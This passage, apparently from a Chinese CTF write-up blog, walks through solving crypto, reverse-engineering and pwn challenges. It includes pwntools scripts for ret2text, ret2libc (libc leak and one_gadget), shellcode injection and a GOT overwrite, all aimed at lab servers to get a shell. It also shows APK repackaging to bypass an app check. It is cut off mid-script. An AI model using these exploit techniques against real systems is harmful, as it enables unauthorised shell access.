key\n    xn = []\n    xn.append(x)\n    if flags:\n        xn.append(1 - 2 * xn[0]**2)\n    else:\n        xn.append(k2 * xn[0]**3 + (1 - k2)*xn[0])\n    for i in range(times):\n        assert xn[i]>=-1 and xn[i]<=1 and xn[i+1]>=-1 and xn[i+1]<=1\n        if flags:\n            xn.append((1 - 2 * xn[i]**2)*(k1 * xn[i+1]**3 + (1 - k1)*xn[i+1]))\n        else:\n            xn.append((k2 * xn[i]**3 + (1 - k2)*xn[i])*(1 - 2 * xn[i+1]**2))\n    return xn[times + 1]\n  \n  \ndef init():\n    sum, r, k = 0, 1, []\n    k1 = random.uniform(3.2, 4)\n    k2 = random.uniform(3.2, 4)\n    for i in range(16):\n        k.append(random.randint(1,256))\n        sum += k[-1]\n        r ^= k[-1]  \n    a_1 = (sum/256) % 1\n    timea1 = 3 + int(1000 * a_1) % 30\n    b_1 = (r/256)\n    timeb1 = 3 + int(1000 * b_1) % 30\n    xc_1 = a_1 * b_1\n    yc_1 = (a_1 + b_1) % 1\n    print('k1, k2 = %r, %r'%(k1, k2))\n    print('k = %r'%k)\n    return (k1, k2), (a_1, timea1, b_1, timeb1, xc_1, yc_1)\n  \n  \ndef encrypt(key, data, flag):\n    (k1, k2) = key\n    (a_1, timea1, b_1, timeb1, xc_1, yc_1) = data\n    flag = list(flag)\n    m, c = [], []\n    miu, omiga = [], []\n    ta = timea1\n    tb = timeb1\n    for tmp in flag:\n        mi = ord(tmp)\n        miu.append(LC(key, a_1, ta, 1))\n        omiga.append(LC(key, b_1, tb, 0))\n        c.append(((int(miu[-1] * 1000) + int(omiga[-1] * 1000)) ^ mi) % 256)\n        delta = c[-1]/256\n        for i in range(3):\n            y = (yc_1 + delta) % 1\n            y = k1 * y**3 + (1 - k1) * y\n            x = xc_1\n            x = k2 * x**3 + (1 - k2) * x\n        ta = 3 + int(1000 * x) % 30\n        tb = 3 + int(1000 * y) % 30\n    print('c = %r'%(c))\n    return c\n  \n  \nif __name__==\"__main__\":\n    # print(flag)\n    key, data = init()\n    c = encrypt(key, data, flag)\n  \n  \n'''\nk1, k2 = 3.967139695598587, 3.7926025078694305                                          \nk = [107, 99, 55, 198, 210, 56, 137, 44, 127, 25, 150, 113, 75, 215, 187, 132]          \nc = [23, 84, 105, 111, 230, 105, 97, 50, 58, 61, 25, 97, 57, 21, 175, 77, 102, 138, 120, 17, 66, 172, 52, 178, 101, 221, 109, 126, 71, 149, 63, 32, 56, 6, 134, 255, 110, 57, 15, 20, 116]\n'''\n```\n\n已知条件：k1,k2,c\n\n![](http://cdn.anyiblog.top/common/1664068238123-8a374cdd-f590-4940-a91f-4ef9d320bbc9.jpg)  \n\n\n先看最底下先运行的部分,key,data = init()，跟进\n![](http://cdn.anyiblog.top/common/1664068238436-7ceab14e-64b0-4769-a774-6cb1c9e258cc.jpg)  \n首先，k1,k2是3.2到4区间的随机小数，题目print出来了，也就是key。 这是题目给我们的已知条件key\n\n其次，sum,r,k给了我们，其中k也被print出来，我们看看k是什么东西。\n\n![](http://cdn.anyiblog.top/common/1664068238761-fccac5f9-03f5-4ebe-9ebe-8864c62f2a8d.jpg)  \nk经过了16次循环，每次添加1-256之间的随机数，与此同时 sum和r也与k有关，那么题目告诉了我们k还有sum和r的原值，我们可以推出sum和r\n\nsum和r又有什么用呢？\n\n![](http://cdn.anyiblog.top/common/1664068239111-621fae11-c6b5-42a8-9bb5-f434e71c38fd.jpg)  \n这些数据都与sum和r有关，只要我们知道了sum和r，就可以知道这些数据，也就是return回去的data\n\n所以我们已知条件已有：sum，r，k\n\n可以推出 => a\\_1, timea1, b\\_1, timeb1, xc\\_1, yc\\_1 => data\n\n已知：k1，k2 可以推出=> key\n\n先写脚本把data推出，遍历k，然后得出sum和r 最后把每个值得出即可。\n\n```\nsum, r, k = 0, 1, [107, 99, 55, 198, 210, 56, 137, 44, 127, 25, 150, 113, 75, 215, 187, 132]  \nk1,k2 = 3.967139695598587, 3.7926025078694305\nfor i in k:\n    sum += i\n    r ^= i\na_1 = (sum/256) % 1\ntimea1 = 3 + int(1000 * a_1) % 30\nb_1 = (r/256)\ntimeb1 = 3 + int(1000 * b_1) % 30\nxc_1 = a_1 * b_1\nyc_1 = (a_1 + b_1) % 1\n  \n  \ndata = (a_1, timea1, b_1, timeb1, xc_1, yc_1)\n  \n  \nkey = (k1,k2)\n  \n  \nprint(key,data)\n```\n\n![](http://cdn.anyiblog.top/common/1664068239443-a6eb9e47-aeed-4efa-9a31-e265304d625d.jpg)  \n\n得到了数据，再次跟看encrypt函数，这个函数要用的参数key和data我们都有，flag需要我们推出\n\n\n![](http://cdn.anyiblog.top/common/1664068239779-dafbd3c7-9a41-4b6a-99cc-8da6e55ff50d.jpg)  \n刚开始进行了取key和data里面的数据，然后把flag变为列表，定义了很多列表 很多值，这些不关键，重要的是中间的for循环\n\n![](http://cdn.anyiblog.top/common/1664068240090-b6cbbe63-b8d0-4b54-9ba3-88459af67652.jpg)  \n这个操作是遍历flag给tmp，之后mi = ord(tmp) 就是取循环中每一次flag的ascii码。\n\nmiu.append(LC(key, a\\_1, ta, 1))\nomiga.append(LC(key, b\\_1, tb, 0))\n\n这里又引用了LC函数，这里如果跟进又会觉得很复杂，但其实呢，LC函数里的key,a1，ta等等参数就是我刚刚的data和key的内容，所以我们根本不需要知道LC函数的内容，直接复制然后引用即可\n\nc.append(((int(miu\\[-1\\] \\* 1000) + int(omiga\\[-1\\] \\* 1000)) ^ mi) % 256)\n\n这里变量c是题目给出的可知条件，所以我们可以用变量c反推出未知变量mi，也就是flag的每一部分，miu\\[-1\\]和omiga\\[-1\\]就是取每一次循环新添加的值，我们解密的时候直接遍历取循环数就行了。\n\n由于我们有key和data，所以可以直接得出LC函数的返回值，即我们已得知miu和omiga变量的内容，又因为题目给出了列表c的内容，那么我们就可以推出mi 即flag\n\n可以说重要的内容就这些了，那么下面的一部分内容是什么呢\n\n![](http://cdn.anyiblog.top/common/1664068240539-fbd3c58e-258e-4ebe-ba89-5c24159679c0.jpg)  \n因为miu和omiga每次添加LC函数内容的返回值时，要用到ta和tb，这两个值在每一次循环都是变动的，所以我们每次循环还要把这两个值得出才能保证最终flag的准确性\n\n但由于里面的值我们都是知道的，所以直接带入即可，唯一需要修改的就是把delta = c\\[-1\\]/256 改成我们到时候遍历的值即可。\n\n所以这题其实一点都不难，关键的条件都是已知，只是看着比较复杂\n\n\n最后我们写脚本解密，已知条件的部分不用修改，只用修改c.append(((int(miu\\[-1\\] \\* 1000) + int(omiga\\[-1\\] \\* 1000)) ^ mi) % 256)和delta = c\\[-1\\]/256\n\n```\ndef LC(key, x, times, flags):\n    (k1, k2) = key\n    xn = []\n    xn.append(x)\n    if flags:\n        xn.append(1 - 2 * xn[0]**2)\n    else:\n        xn.append(k2 * xn[0]**3 + (1 - k2)*xn[0])\n    for i in range(times):\n        assert xn[i]>=-1 and xn[i]<=1 and xn[i+1]>=-1 and xn[i+1]<=1\n        if flags:\n            xn.append((1 - 2 * xn[i]**2)*(k1 * xn[i+1]**3 + (1 - k1)*xn[i+1]))\n        else:\n            xn.append((k2 * xn[i]**3 + (1 - k2)*xn[i])*(1 - 2 * xn[i+1]**2))\n    return xn[times + 1]\n  \n  \nm, c = [], [23, 84, 105, 111, 230, 105, 97, 50, 58, 61, 25, 97, 57, 21, 175, 77, 102, 138, 120, 17, 66, 172, 52, 178, 101, 221, 109, 126, 71, 149, 63, 32, 56, 6, 134, 255, 110, 57, 15, 20, 116]\nmiu, omiga = [], []\nta = timea1\ntb = timeb1\n  \n  \nres = []\nfor flag in c:\n    miu.append(LC(key, a_1, ta, 1))\n    omiga.append(LC(key, b_1, tb, 0))\n    res.append(((int(miu[-1] * 1000) + int(omiga[-1] * 1000))%256)^flag)\n    delta = flag/256\n    for i in range(3):\n        y = (yc_1 + delta) % 1\n        y = k1 * y**3 + (1 - k1) * y\n        x = xc_1\n        x = k2 * x**3 + (1 - k2) * x\n    ta = 3 + int(1000 * x) % 30\n    tb = 3 + int(1000 * y) % 30\n  \nprint(res)\n```\n\n\n只需把原脚本tmp修改成我们遍历c取得值即可。\n\n![](http://cdn.anyiblog.top/common/1664068240865-9821b536-8d38-4a18-b28c-1cdfce2f9fbb.jpg)  \n打印结果：\n\n![](http://cdn.anyiblog.top/common/1664068241184-f8f8eff9-fdb8-47ee-8239-79ec24d760bb.jpg)  \n看到这个102对应的就是f，只要都ascii解码下就是最终flag了。\n\n最终脚本：\n\n```\nsum, r, k = 0, 1, [107, 99, 55, 198, 210, 56, 137, 44, 127, 25, 150, 113, 75, 215, 187, 132]  \nk1,k2 = 3.967139695598587, 3.7926025078694305\nfor i in k:\n    sum += i\n    r ^= i\na_1 = (sum/256) % 1\ntimea1 = 3 + int(1000 * a_1) % 30\nb_1 = (r/256)\ntimeb1 = 3 + int(1000 * b_1) % 30\nxc_1 = a_1 * b_1\nyc_1 = (a_1 + b_1) % 1\n  \n  \ndata = (a_1, timea1, b_1, timeb1, xc_1, yc_1)\n  \n  \nkey = (k1,k2)\n  \n  \nprint(key,data)\n  \ndef LC(key, x, times, flags):\n    (k1, k2) = key\n    xn = []\n    xn.append(x)\n    if flags:\n        xn.append(1 - 2 * xn[0]**2)\n    else:\n        xn.append(k2 * xn[0]**3 + (1 - k2)*xn[0])\n    for i in range(times):\n        assert xn[i]>=-1 and xn[i]<=1 and xn[i+1]>=-1 and xn[i+1]<=1\n        if flags:\n            xn.append((1 - 2 * xn[i]**2)*(k1 * xn[i+1]**3 + (1 - k1)*xn[i+1]))\n        else:\n            xn.append((k2 * xn[i]**3 + (1 - k2)*xn[i])*(1 - 2 * xn[i+1]**2))\n    return xn[times + 1]\n  \n  \nm, c = [], [23, 84, 105, 111, 230, 105, 97, 50, 58, 61, 25, 97, 57, 21, 175, 77, 102, 138, 120, 17, 66, 172, 52, 178, 101, 221, 109, 126, 71, 149, 63, 32, 56, 6, 134, 255, 110, 57, 15, 20, 116]\nmiu, omiga = [], []\nta = timea1\ntb = timeb1\n  \n  \nres = []\nfor flag in c:\n    miu.append(LC(key, a_1, ta, 1))\n    omiga.append(LC(key, b_1, tb, 0))\n    res.append(((int(miu[-1] * 1000) + int(omiga[-1] * 1000))%256)^flag)\n    delta = flag/256\n    for i in range(3):\n        y = (yc_1 + delta) % 1\n        y = k1 * y**3 + (1 - k1) * y\n        x = xc_1\n        x = k2 * x**3 + (1 - k2) * x\n    ta = 3 + int(1000 * x) % 30\n    tb = 3 + int(1000 * y) % 30\nprint(res)\n  \n  \nf = \"\"\nfor i in res:\n    f += chr(i)\nprint(f)\n  \n```\n\n![](http://cdn.anyiblog.top/common/1664068241536-87e81323-d976-436c-8c81-a235e866103a.jpg)  \n\n# Reverse\n\n## Re1.Hello\\_Reverse\n\n下载附件 64位，无壳\n![](http://cdn.anyiblog.top/common/1664068241938-c4548335-4bad-479a-9e43-6343469ea028.jpg)  \n主函数发现一半的flag，还有一半在.rdata段中\n\n![](http://cdn.anyiblog.top/common/1664068242300-2332dbde-881a-49ce-8d9e-fa4e3ccba627.jpg)  \nflag就是两个拼接在一起\n\n## Re2.Baby\\_Re\n\n64位程序分析，\n\n![](http://cdn.anyiblog.top/common/1664068242708-00affcbc-24c6-401b-a873-e5a503771247.jpg)  \n看到底下，输入的字符串异或i过后经过compare函数后return 1时就说明flag正确\n\n跟进compare函数\n\n![](http://cdn.anyiblog.top/common/1664068243059-291bc11e-8435-42b8-99c1-02d984a51e73.jpg)  \n可以看到flag为32位长，然后遍历输入的字符串，要求和final一样。跟进final，\n\n![](http://cdn.anyiblog.top/common/1664068243431-798dcac3-2a07-496c-92b9-7f47ec1b7b92.jpg)  \n写脚本，for循环final长度并将我们final字符串一一异或for循环的次数。\n\n```\nfinal = [0x66,0x6d,0x63,0x64,0x7f,0x56,0x69,0x6a,0x6d,0x7d,0x62,0x62,0x62,0x6a,0x51,0x7d,0x65,0x7f,0x4d,0x71,0x71,0x73,0x79,0x65,0x7d,0x46,0x77,0x7a,0x75,0x73,0x21,0x62]\nflag = \"\"\nfor i in range(len(final)):\n    flag += chr(final[i]  ^i)\nprint(flag)\n```\n\n![](http://cdn.anyiblog.top/common/1664068243778-ccc094e1-0989-4fc3-8cf8-3f4ccb29b8db.jpg)运行后得到flag，但这个flag是错误的。\n\n经过flag内容和题目提示，说明还有些细节遗漏，\n\n再次分析ida 发现有四个bytes\n\n![](http://cdn.anyiblog.top/common/1664068244132-d838d758-86ca-49c7-8588-c08d7c48f982.jpg)  \n\n跟进functionname，发现\n![](http://cdn.anyiblog.top/common/1664068244482-12c91c0f-509f-4f0d-b40f-c710b564ebe1.jpg)  \n\n发现有4个字节要修改。对应改下重新运行，\n```\nfinal = [0x66,0x6d,0x63,0x64,0x7f,0x56,0x36,0x6a,0x6d,0x7d,0x3a,0x62,0x62,0x6a,0x51,0x7d,0x65,0x7f,0x4d,0x71,0x71,0x73,0x26,0x65,0x7d,0x46,0x77,0x7a,0x75,0x73,0x3f,0x62]\nflag = \"\"\nfor i in range(len(final)):\n    flag += chr(final[i]  ^i)\nprint(flag)\n```\n\n![](http://cdn.anyiblog.top/common/1664068244835-4dcaed2d-3c02-4e52-9c1b-8a921fddf768.jpg)  \n\n## Re3.Pyre\n\n下载附件exe\n![](http://cdn.anyiblog.top/common/1664068245150-441a860b-0444-4b92-940f-5ad875cf72c1.jpg)  \n\n看到这个图标，直接就知道是用py编译起来的exe\n\n查了下百度，了解到用pyinstxtractor.py 可以将pyre进行反编译\n\npython pyinstxtractor.py pyre.exe\n\n反编译后，会生成一个文件夹\n\n![](http://cdn.anyiblog.top/common/1664068245540-a04e6532-8128-4f0c-a278-8ac513197707.jpg)  \n这个pyre就是.pyc文件，不过我们还需要修改pyc文件头到这个文件头部，这个文件头可以复制struct的\n\nwinhex打开struct，复制文件头直到E3\n\n![](http://cdn.anyiblog.top/common/1664068245930-62cf4beb-c686-4183-949e-32e6be6ed765.jpg)  \n然后复制到pyre里\n\n![](http://cdn.anyiblog.top/common/1664068246364-b79aa07e-52b0-4ddd-be98-0453c8453a2b.jpg)  \n改pyre后缀为.pyc，那么pyc就搞好了，然后就用uncompyle6进行pyc反编译py\n\nuncompyle6 -o pyre.py pyre.pyc\n\n反编译后，看py源码\n\n![](http://cdn.anyiblog.top/common/1664068246792-d019cf50-860d-4d22-bb14-8bb8790e5002.jpg)  \n一个简单的逆向，我们解密可以先创造一个和encode一样长的列表，然后遍历table的数字将数字对应encode的字母添加到列表的下标\n\n```\nencode = 'REla{PSF!!fg}!Y_SN_1_0U'\ntable = [7, 8, 1, 2, 4, 5, 13, 16, 20, 21, 0, 3, 22, 19, 6, 12, 11, 18, 9, 10, 15, 14, 17]\nflag = ['']*(len(encode))\nfor i in range(len(table)):\n    flag[table[i]] = encode[i]\nprint(''.join(flag))\n```\n\n![](http://cdn.anyiblog.top/common/1664068247096-871dfbda-c8ef-4635-90d4-8e8afa62640f.jpg)  \n\n## Re4.EasyRe\n\n下载附件得到exe和dll文件，IDA分析exe\n\n![](http://cdn.anyiblog.top/common/1664068247502-121f5c1f-7f29-46b0-a70e-b3d7bb020474.jpg)  \n首先exe会加载dll，调用dll里的函数，注意55行 定义encode为enc.dll里中的encode函数\n\n然后62-64行就是将输入的字符串进行encode，然后与final比较\n\n所以继续分析enc.dll，查看里面的encode函数\n\n![](http://cdn.anyiblog.top/common/1664068247885-aaae8848-85f6-43a9-8e17-4f2e7b766459.jpg)  \n先看最后return里的函数，跟进。\n\n![](http://cdn.anyiblog.top/common/1664068248193-b18a4a3f-74aa-4bd0-bccb-0099a7bab8c4.jpg)  \n![](http://cdn.anyiblog.top/common/1664068248496-5fdb093e-bd03-4ffc-920a-02e0dad1fdef.jpg)  \n如果我们要逆推那么首先就要跟Str进行异或，然后再接下来的函数\n\n这里的encode函数大概意思就是将a1的值经过一系列操作后赋值给a2，然后a2再异或变量Str里的内容，最终返回a2值\n\n刚开始做这题被中间的算法难到了，要逆推太麻烦了，幸运的是我翻之前的题目的时候正好看到有一套算法就是这样，其实这个算法就是base64加密的操作，所以我们只需要将最后return里的函数进行异或后，再base64解密即可。\n\n读懂了函数，就可以写脚本了，将final写列表里然后我们遍历Reverse异或 最后base64解密就是flag了。需要注意的是final中第14个元素没告诉我们，这里我的解法是遍历所有ascii爆破最后的flag。\n\n```\nimport base64\nimport string\n  \n  \nfinal = [8,8,14,13,40,64,17,17,60,46,43,30,61,15,'',3,59,61,60,21,40,5,80,70,63,42,57,9,49,86,36,28]\nfor i in '?$P<,%#K':\n    final.append(ord(i))\nprint(final)\nStr= \"Reverse\"\nflag = []\nfor i in range(len(final)):\n    try:\n        flag.append(chr(final[i]^ord(Str[i%len(Str)])))\n    except:\n        flag.append(final[i])\nfor i in string.ascii_letters+string.digits:\n    flag[14] = i\n    content =\"\".join(flag)\n    b64 = base64.b64decode(content)\n    print(b64)\n```\n\n\n![](http://cdn.anyiblog.top/common/1664068248872-272e0907-2b79-4e9d-874a-7f2fef7ad4e8.jpg)  \n最后也是成功爆破出来真正的flag\n\n## Re5.艾克体悟题\n\n作者给出了提示，https://note.youdao.com/ynoteshare/index.html?id=a006b246edc7fc65ed20abbc2d9c5351&type=note&\\_time=1663716620460\n\napk逆向，提示告诉我们如何安装apk、apk反编译，以及adb shell启动指定活动\n\n我们通过adb shell打开flag活动，发现需要点击按钮1w次得到flag\n\n![](http://cdn.anyiblog.top/common/1664068249237-4916913f-d8d2-4a66-a846-418d3b4ce2d8.jpg)  \n这里我的思路是apk反编译后重新打包，将1w这个数值改成1\n\n逆向开始！\n\n下载apktool   [https://ibotpeaches.github.io/Apktool/](https://ibotpeaches.github.io/Apktool/)  这个工具作用就是将apk反编译和重新打包\n\n输入java -jar apktool\\_2.4.1.jar d demo.apk -o demo\n\n![](http://cdn.anyiblog.top/common/1664068249569-f4e5de9d-ed81-442d-816e-f143d29b4bce.jpg)等待一段时间，就会生成文件夹了\n\n进入文件夹修改文件，在smali/com/droidlearn/activity\\_travel/目录下找到FlagActivity$1.smali文件，这个smali文件是可以直接编辑器打开看的\n\n无需看懂，直接找到0x2710（10000）十六进制，这个数值就是关键，修改为0x1即可\n\n![](http://cdn.anyiblog.top/common/1664068250026-467b0937-6861-4a93-9bb3-d745d16950e7.jpg)  \n修改过后，我们重新打包即可。\n\n打包指令，输入java -jar apktool\\_2.4.1.jar b demo -o demo\\_repackage.apk\n\n![](http://cdn.anyiblog.top/common/1664068250363-80f67320-a696-4567-a7e8-5a67fbb7493a.jpg)  \n生成出一个apk即打包完毕，需要注意打包后的apk并不可用 还需要安装签名。\n\n安装至夜神模拟器，用/nox/bin目录下的adb工具进行安装，adb install \\[apk\\]\n![](http://cdn.anyiblog.top/common/1664068250652-9f68298e-6562-46f1-8a62-049559d1785c.jpg)  \n发现报错，这就是没有签名的原因。\n\n使用JRE环境变量下的keytool生成口令文件\n\nkeytool -genkey -alias testalias -keyalg RSA -keysize 2048 -validity 36500 -keystore test.keystore\n\n这条命令重要的是-alias testalias\n\n![](http://cdn.anyiblog.top/common/1664068251020-84824277-2e19-4e44-a5c6-97edad837784.jpg)  \n输入口令密码和一堆问题的答案\n\n生成成功后会在目录下创建.keystore文件，keytool -list -v -keystore test.keystore查看详细信息，这里的别名很重要\n\n最后就是为我们的apk签上名即可\n\njarsigner -verbose -keystore test.keystore -storepass 123456 -signedjar flag.apk new.apk testalias\n\n\\-keystore +签名文件，\n\\-sotrepass +签名口令密码,\n\\-signedjar后跟三个参数 分别是签名后的apk文件 需要签名的apk文件 签名的别名\n\n最后输入后即可生成flag.apk 此时我们adb就可以安装了\n\n![](http://cdn.anyiblog.top/common/1664068251689-efa90410-5c09-41e5-8a08-8f835d8d1e28.jpg)  \n夜神模拟器安装签名后的apk文件，adb install flag.apk\n![](http://cdn.anyiblog.top/common/1664068251960-581a37d8-7dff-4cca-a47c-4f239e818e2d.jpg)  \n成功安装，\n\n![](http://cdn.anyiblog.top/common/1664068252298-805de6c4-b1e4-44ca-9903-e0e140071aea.jpg)  \n输入adb shell进入调试\n\n可以用am start -n 包名/包名.活动名 这个指令让你的夜神模拟器打开某个包的某个活动，\n\n那么要怎么看包名呢，输入pm list package 这个指令会列出模拟器中所有的包\n\n![](http://cdn.anyiblog.top/common/1664068252629-2c58ace8-48e4-458a-81e6-0df9e716d85f.jpg)  \n筛选找到你的包名即可，然后活动名可以用jadx-gui分析源码\n\n![](http://cdn.anyiblog.top/common/1664068253561-8b2cb0ab-4178-460e-a8ff-83d83de730d9.jpg)  \n红框的部分都是活动名，我们想打开哪一部分就指定哪块活动名\n\n比如我想打开main函数，那命令就是am start -n com.droidlearn.activity\\_travel/com.droidlearn.activity\\_travel.MainActivity\n\n输入之后夜神模拟器就会打开我们安装的apk的main函数 也就是打开\n\n![](http://cdn.anyiblog.top/common/1664068253903-335ff356-eae1-45a5-9715-6f0dcf15fabd.jpg)  \n这里我们要用flag函数，所以命令为am start -n com.droidlearn.activity\\_travel/com.droidlearn.activity\\_travel.FlagActivity\n\n![](http://cdn.anyiblog.top/common/1664068254223-b393f492-787f-43b6-baca-09cd08d36902.jpg)  \n这样我们就能通过adb打开隐藏的 或是apk中打不开的部分函数\n\n因为我们修改了数值，原本需要我们点击1w下才有flag，现在我们点击一下即可获得flag\n\n![](http://cdn.anyiblog.top/common/1664068254598-82355d53-fbc4-4978-b05c-48643762e8b5.jpg)  \n\n\n# Pwn\n\n## Pwn1.ret2text\n\n64位附件，下载附件，分析源码。\n\n![](http://cdn.anyiblog.top/common/1664068254973-e52d5e0c-ec6c-44f2-be0f-4f1ec553fd07.jpg)  \n给了后门backdoor\n\n![](http://cdn.anyiblog.top/common/1664068255307-89aaa71b-87d9-4185-b71f-5ab45c6ae48e.jpg)  \n很简单的栈溢出，溢出后跳转到后门地址即可获得shell\n\nv4溢出量32\n![](http://cdn.anyiblog.top/common/1664068255591-75357c56-18df-4d0c-b2b2-43bdf70101f8.jpg)  \n构造payload\n\n```\nfrom pwn import *\n  \n  \np=remote('node4.buuoj.cn',29527)\n  \n  \npayload = b'a'*(0x20+0x08) + p64(0x400708)\n  \n  \np.sendline(payload)\n  \n  \np.interactive()\n  \n```\n\n![](http://cdn.anyiblog.top/common/1664068255948-e51deefb-0989-4fd2-9cae-be66be2214e5.jpg)  \n\n## Pwn2.calc\n\n64位程序\n\n重要函数\n![](http://cdn.anyiblog.top/common/1664068256363-1990004c-0688-440c-975a-107eaa960b11.jpg)  \n![](http://cdn.anyiblog.top/common/1664068256669-cabe8b83-901e-4dd9-b731-7d876b1cb246.jpg)  \n\n![](http://cdn.anyiblog.top/common/1664068257013-7096d65a-46f7-4a59-bff2-a0d804ce3392.jpg)\n\n一个计算程序，在30s内答对100道计算题即可拿到shell\n\n思路是用pwntool接收列式，然后计算发送结果即可。python的eval函数可以帮我们自动计算\n\n```\nfrom pwn import *\n  \n  \np = remote('node4.buuoj.cn',29946)\n  \n  \nfor i in range(100):\n    p.recvuntil('answer?')\n  \n  \n    n = p.recvline().decode()\n  \n    print(n)\n  \n    question = n.strip().split('=')[0]\n  \n  \n    if 'x' in question:\n        question = question.replace('x','*')\n  \n  \n    answer = str(eval(question))\n  \n  \n    p.sendline(answer)\n  \n  \np.interactive()\n  \n```\n![](http://cdn.anyiblog.top/common/1664068257390-71c02a4e-56e8-4a2b-9ead-adf5d8a822ce.jpg)  \n\n## Pwn3.ret2libc\n\n64位，libc版本2.31\n\n![](http://cdn.anyiblog.top/common/1664068257749-b2b02198-9f48-4367-95f7-7ceade540f87.jpg)  \ns存在溢出，溢出量为32，题目没给后门，如题目名所说ret2libc\n\n题目给了libc所以可以用one\\_gadget找到execve和puts的相对地址\n\n思路是溢出后泄露puts的真实地址，然后构造libc 最终构造execve\\_addr，我们满足偏移后加上p64(pop) + p64(0)\\*4 +p64(execve\\_addr)就可以拿到shell了\n\n本来常规做法是想直接泄露system和/bin/sh，但是发送过去无法拿到shell。所以换了种做法\n\n第一次发送溢出，泄露puts地址并接收，改写返回第二次地址为main以便我们再次构造\n```\ncontext.log_level = 'debug'\n  \n  \np = remote('node4.buuoj.cn',28197)\n  \n  \nelf = ELF('./pwn2')\n  \n  \nlibc = ELF('./libc-2.31.so')\n  \n  \nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nrdi = 0x0000000000400753\nmain = 0x400698\n  \n  \npayload = b'a'*(0x20+0x08) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)\n  \n  \np.sendline(payload)\n  \n  \nputs_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00'))\n  \n  \nprint(hex(puts_addr))\n```\n\none\\_gadget查找后门和puts相对地址\n\n![](http://cdn.anyiblog.top/common/1664068258128-f1e377bd-52c8-4645-a876-8efb3df68e04.jpg)  \n溢出之后我们还需要找一个pop rdi;ret 该execve限制为r12和r15都为0即可，\n\nRopgadget查找\n\n![](http://cdn.anyiblog.top/common/1664068258462-e5e67d3b-512e-4cb8-9c16-62b5212651a6.jpg)  \n第二次发送，计算libc基址以及execve地址，构造最终payload，获得shell\n\n```\nputs_offset = 0x84420\nexecve = 0xe3afe\npop = 0x000000000040074c\n  \n  \nlibc_addr = puts_addr - puts_offset\n  \nexecve_addr = libc_addr + execve\n  \npayload = b'a'*(0x20+0x08) + p64(pop) + p64(0)*4 + p64(execve_addr) #调用pop_addr清除掉r12和r15为0，返回地址改为execve_addr\n  \np.sendafter('time?',payload) #这里一定要用send\np.interactive()\n```\n\n\n![](http://cdn.anyiblog.top/common/1664068258992-994d6b59-9d0a-44cc-8456-ee561ae4b90a.jpg)  \n最终payload\n\n```\nfrom pwn import *\n  \n  \ncontext.log_level = 'debug'\n  \n  \np = remote('node4.buuoj.cn',28197)\n  \n  \nelf = ELF('./pwn2')\n  \n  \nlibc = ELF('./libc-2.31.so')\n  \n  \nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nrdi = 0x0000000000400753\nmain = 0x400698\n  \n  \npayload = b'a'*(0x20+0x08) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)\n  \n  \np.sendline(payload)\n  \n  \nputs_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00'))\n  \n  \nprint(hex(puts_addr))\n  \n  \nputs_offset = 0x84420\nexecve = 0xe3afe\npop = 0x000000000040074c\n  \n  \nlibc_addr = puts_addr - puts_offset\n  \n  \nexecve_addr = libc_addr + execve\n  \n  \npayload = b'a'*(0x20+0x08) + p64(pop) + p64(0)*4 + p64(execve_addr)\n  \n  \np.sendafter('time?',payload)\n  \n  \np.interactive()\n```\n\n\n## Pwn4.ret2shellcode\n\n64位程序\n![](http://cdn.anyiblog.top/common/1664068259391-c6a52e99-5eac-476c-bc5a-ef50c10a8d8b.jpg)  \n开了NX保护：\n\n![](http://cdn.anyiblog.top/common/1664068259718-22b02145-7133-4d81-97a9-7057ce4546b9.jpg)  \n刚开始不知道哪里可以写shellcode，用gdb调试下\n\npwn-peda运行后vmmap看哪些地址有写入的权限\n\n![](http://cdn.anyiblog.top/common/1664068260104-34950d20-67b6-4e25-94fb-cfbb6832e9fa.jpg)  \n发现0x00233000具有最高权限，后面发现这个就是开头mmap申请的0x1000大小的块\n\n![](http://cdn.anyiblog.top/common/1664068260388-a6c94445-b23f-478f-98cd-644fe48a8e2b.jpg)  \n那么只要我们的shellcode写到这个地址就可以执行shellcode的恶意代码 从而拿到shell\n\n可以用pwntool的asm生成shellcode以及flat构造payload 很好用\n\npayload = flat(\\[shellcode,cyclic(offset),addr\\])\n\n注意context设置系统位数为64 os为linux。\n\n```\nfrom pwn import *\n  \n  \ncontext(arch = 'amd64',log_level='debug',os='Linux')\n  \n  \np = remote('node4.buuoj.cn',27191)\n  \n  \nshellcode = asm(shellcraft.sh())\n  \n  \npayload = flat([shellcode,cyclic(0x8),0x233000])\n  \n  \npayload = shellcode + b'a'*(0x8) + p64(0x233000)\n  \n  \nprint(payload)\n  \n  \np.sendline(payload)\n  \n  \np.sendline(payload)\n  \n  \np.interactive()\n```\n\n![](http://cdn.anyiblog.top/common/1664068260867-3b6491cf-1521-46df-9007-899b9251a021.jpg)  \n\n## Pwn5.fallw1nd’s gift\n\n题目提示 libc版本2.31\n\n![](http://cdn.anyiblog.top/common/1664068261630-73cfc6cc-a771-4b0d-82b8-77f57936c105.jpg)  \n64位程序\n\n![](http://cdn.anyiblog.top/common/1664068262064-3ecab5d7-c333-42ae-b7cd-c3972266fb54.jpg)  \n\n题目上来就给了puts的真实地址，后面可以用来泄露system的地址，然后scanf(\"%p\",buf)这条命令可以到达任意一个地址\n\n最后read(0,buf\\[0\\],0x10)就可以直接覆盖地址的内容\n\n程序最后面一个puts('/bin/sh')可以考虑将puts修改为system，也就是将puts的got表修改成system\n\n所以思路就是首先将puts的got表发送给buf（这里puts\\_got发送时要发送hex(puts\\_got) 因为scanf(%p)只接收十六进制数），然后在read里修改buf内容为system的地址，system的地址可以用开头给的puts地址泄露。\n\n最终执行system('/bin/sh')拿到shell\n\n  \n\n坑点就是用libcsearcher找到的10个libc都是不能用的，加上我的虚拟机是kali glibc版本内核为2.33 所以libc比较麻烦\n\n如果是用ubuntu去打那就可以直接打通了。后面发现这个2.31的libc在ret2libc就给了，是通用的\n\n```\nfrom pwn import *\n  \n  \np = remote('node4.buuoj.cn',25365)\n  \n  \nelf = ELF('./fallw1nd_gift')\n  \n  \nputs_got = elf.got['puts']\n  \n  \ncontext.log_level='debug'\n  \n  \np.recvuntil('reward:\\n')\n  \n  \naddr = p.recv().split(b'\\n')[0].decode().strip()\n  \n  \np.sendline(hex(puts_got))\n  \n  \nputs_addr = int(addr,16)\n  \n  \nprint(addr)\n  \n#libc = 